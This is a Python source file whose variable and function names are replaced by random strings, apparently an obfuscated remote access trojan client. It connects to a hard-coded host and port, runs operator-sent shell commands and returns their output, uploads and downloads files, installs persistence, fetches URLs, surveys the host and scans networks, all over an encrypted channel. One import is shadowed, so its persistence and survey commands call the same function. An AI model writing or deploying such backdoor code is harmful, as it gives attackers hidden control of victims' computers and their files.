#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import PVayTxzTsXuVHdaTbmvmjjKYIcPvDCfp, nWfpHMtglmECQdQYhOJEvgLDLAxncADh, GmCEpXaBzxpjGMiONYNnyrBNiwXoeFeX
    from core.filesock import VZMYYKflhhpoDVoMZpjdZXgOvFauOPCJ, HzAjoiVYonBFgBOJBQkRmNoIKrnQyXOB
    from core.persistence import ARakDxFSUheNtJlTHfcXYGrHeJqrDiaq
    from core.scan import yShuNOqUqzALOCGCHoYOlDhwzZsDXaRP
    from core.survey import ARakDxFSUheNtJlTHfcXYGrHeJqrDiaq
    from core.toolkit import PlOfLCyrxgxNAxXDeIcCEPXCWCAHjkCM, rnwqXTByWxsicjfOSpWVLNleVrtRtZmw
except ImportError as cWlqrfvNzzxrbrTekPlaLEzlYjkybXLa:
    print(cWlqrfvNzzxrbrTekPlaLEzlYjkybXLa)
    sys.exit(0)
nMtEHNdVYUdlafAxdevVnqdpFWyFdDll = sys.platform
ofemcGmbSlrLAQXsGLbsrwHdGOAnJzZo      = 'localhost'
SUZDQjuaJkEsDsKVvMEXBUXHuWgefUPU      = 1337
NMraSVcvniQVJXqQpblxxHjwemfblPuc    = 'b14ce95fa4c33ac2803782d18341869f'
def XOVOBRjAHsjqnEEVJTTuVWJqbbKEfUFl():
    hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd = socket.socket()
    hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.connect((ofemcGmbSlrLAQXsGLbsrwHdGOAnJzZo, SUZDQjuaJkEsDsKVvMEXBUXHuWgefUPU))
    GutViovUHfLLmnHwlWnvBSYXhxmgfrwP = GmCEpXaBzxpjGMiONYNnyrBNiwXoeFeX(hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd)
    while True:
        vbGTUErtlQroofRJqWmSBkslfgFjpaop = hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.recv(1024)
        vbGTUErtlQroofRJqWmSBkslfgFjpaop = PVayTxzTsXuVHdaTbmvmjjKYIcPvDCfp(vbGTUErtlQroofRJqWmSBkslfgFjpaop, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP)
        ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi, _, action = vbGTUErtlQroofRJqWmSBkslfgFjpaop.partition(' ')
        if ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'quit':
            hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.close()
            sys.exit(0)
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'run':
            UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM.stdout.read() + UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM.stderr.read()
            hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.sendall(nWfpHMtglmECQdQYhOJEvgLDLAxncADh(UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP))
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'download':
            for wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc in action.split():
                wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc = wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc.strip()
                HzAjoiVYonBFgBOJBQkRmNoIKrnQyXOB(hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd, wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP)
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'upload':
            for wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc in action.split():
                wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc = wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc.strip()
                VZMYYKflhhpoDVoMZpjdZXgOvFauOPCJ(hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd, wwqBDHXrZOHSgkQfVDSpefIWirUGJXXc, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP)
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'rekey':
            GutViovUHfLLmnHwlWnvBSYXhxmgfrwP = GmCEpXaBzxpjGMiONYNnyrBNiwXoeFeX(hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd)
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'persistence':
            UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = ARakDxFSUheNtJlTHfcXYGrHeJqrDiaq(nMtEHNdVYUdlafAxdevVnqdpFWyFdDll)
            hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.send(nWfpHMtglmECQdQYhOJEvgLDLAxncADh(UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP))
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'wget':
            UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = PlOfLCyrxgxNAxXDeIcCEPXCWCAHjkCM(action)
            hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.send(nWfpHMtglmECQdQYhOJEvgLDLAxncADh(UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP))
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'unzip':
            UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = rnwqXTByWxsicjfOSpWVLNleVrtRtZmw(action)
            hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.send(nWfpHMtglmECQdQYhOJEvgLDLAxncADh(UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP))
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'survey':
            UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = ARakDxFSUheNtJlTHfcXYGrHeJqrDiaq(nMtEHNdVYUdlafAxdevVnqdpFWyFdDll)
            hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.send(nWfpHMtglmECQdQYhOJEvgLDLAxncADh(UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP))
        elif ZfsNdMttvbWnEYTAPuhAYhuktFeTNDpi == 'scan':
            UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM = yShuNOqUqzALOCGCHoYOlDhwzZsDXaRP(action)
            hiloaptHmfBAMuDQCBVzsgNTKBsQiGsd.send(nWfpHMtglmECQdQYhOJEvgLDLAxncADh(UgDuTfSJKrzsmpCadLcwLknyrnBJdfJM, GutViovUHfLLmnHwlWnvBSYXhxmgfrwP))
if __name__ == '__main__':
    XOVOBRjAHsjqnEEVJTTuVWJqbbKEfUFl()
